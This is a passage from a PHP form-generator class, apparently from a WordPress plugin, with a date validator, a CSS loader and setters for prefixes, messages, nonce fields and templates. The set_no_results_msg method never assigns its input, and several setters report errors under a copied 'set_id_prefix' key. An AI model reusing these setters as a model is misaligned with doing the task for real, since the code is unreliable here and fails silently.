	 * won't work because the string '0000-00-00' is not empty.
	 *
	 * @param string  $date to be checked
	 * @return boolean whether or not the input is a valid date
	 */
	public function is_date($date) {
		if (empty($date)) {
			return false;
		}
		list( $y, $m, $d ) = explode('-', $date );

		if ( is_numeric($m) && is_numeric($d) && is_numeric($y) && checkdate( $m, $d, $y ) ) {
			return true;
		}
		else {
			return false;
		}
	}

	//------------------------------------------------------------------------------
	/**
	 * This assists us in making custom formatting templates as flexible as possible.
	 *
	 * @return none this populates keys in $this->placeholders
	 * @param array   $array     contains key/value pairs corresponding to placeholder => replacement-values
	 * @param string  $fieldname is the name of the field for which these placeholders are being generated.
	 */
	public function register_global_placeholders($array, $fieldname) {
		foreach ($array as $key => $value) {
			$ph = $fieldname.'.'.$key;
			$this->placeholders[$ph] = $value;
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * Set CSS for the form.  Due to WP's way of printing everything instead of
	 * returning it, we can't add stylesheets easily via a shortcode, so instead
	 * we slurp the CSS defintions (either from a file or string), and print them
	 * into a <style> tag above the form.  Janky-alert!
	 *
	 * @return void (sets a placeholder)
	 * @param string  $css
	 * @param boolean $is_file (optional)
	 */
	public function set_css($css, $is_file=true) {
		if ($is_file) {
			if (file_exists($css)) {
				$this->placeholders['css'] = file_get_contents($css);
			}
			else {
				$this->errors['css_file_not_found'] = sprintf(__('CSS file not found %s'), "<em>$css</em>");
			}
		}
		else {
			$this->placeholders['css'] = $css;
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * Because there can be CSS id conflicts, this function allows the user to set
	 * a custom prefix to all the element ids generated by this class.
	 *
	 * @param string  $prefix used in the field id's.
	 */
	public function set_id_prefix($prefix) {
		if (is_scalar($prefix)) {
			$this->placeholders['id_prefix'] = $prefix;
		}
		else {
			$this->errors['set_id_prefix'] = sprintf( __('Invalid data type passed to %s function. Input must be a string.', CCTM_TXTDOMAIN), __FUNCTION__);
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * Similar to the set_id_prefix function, this function allows the user to set
	 * a custom prefix to all field names generated by this class. This helps avoid
	 * conflicts in the $_POST array.
	 *
	 * @param string  $prefix
	 */
	public function set_name_prefix($prefix) {
		if (is_scalar($prefix)) {
			$this->placeholders['name_prefix'] = $prefix;
		}
		else {
			$this->errors['set_id_prefix'] = sprintf( __('Invalid data type passed to %s function. Input must be a string.', CCTM_TXTDOMAIN), __FUNCTION__);
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * Sets the "No Results" message.
	 *
	 * @param string  $msg the message you want to display if no results are found.
	 */
	public function set_no_results_msg($msg) {
		if (is_scalar($msg)) {
			$this->no_results_msg;
		}
		else {
			$this->errors['set_id_prefix'] = sprintf( __('Invalid data type passed to %s function. Input must be a string.', CCTM_TXTDOMAIN), __FUNCTION__);
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * This allows for a dumb field override, but you could also pass it your own
	 * values, e.g.
	 * $str = wp_nonce_field('my_action', 'my_nonce_name', true, false);
	 *
	 * @param string  $str to be used in as the nonce fields.
	 */
	public function set_nonce_field($str) {
		if (is_scalar($str)) {
			$this->nonce_field = $str;
		}
		else {
			$this->errors['set_id_prefix'] = sprintf( __('Invalid data type passed to %s function. Input must be a string.', CCTM_TXTDOMAIN), __FUNCTION__);
		}
	}


	//------------------------------------------------------------------------------
	/**
	 * If you need to add your own custom placeholders to the form_tpl formatting
	 * string, this is the kosher way to do it.
	 *
	 * @param string  $key   the name of the [+placeholder+] e.g. 'custom_fields'
	 * @param string  $value to replace into the placeholder, e.g. '<p>My long text...</p>'
	 */
	public function set_placeholder($key, $value) {
		$this->placeholders[$key] = $value;
	}


	//------------------------------------------------------------------------------
	/**
	 * Set the formatting template (tpl) used to format the final output of the
	 * generate() method.
	 *
	 * @return none
	 * @param string  $tpl containing the entire formatting string.
	 */
	public function set_tpl($tpl) {
		if (!is_scalar($tpl)) {
			$this->errors['form_tpl_not_string'] = __('Invalid input to set_tpl() function. Input must be a string.');
			return;
		}
		if (empty($tpl)) {
			$this->errors['form_tpl_not_string'] = __('set_tpl(): Formatting string must not be empty!');
			return;
		}

		$this->form_tpl = $tpl;
	}


}


/*EOF*/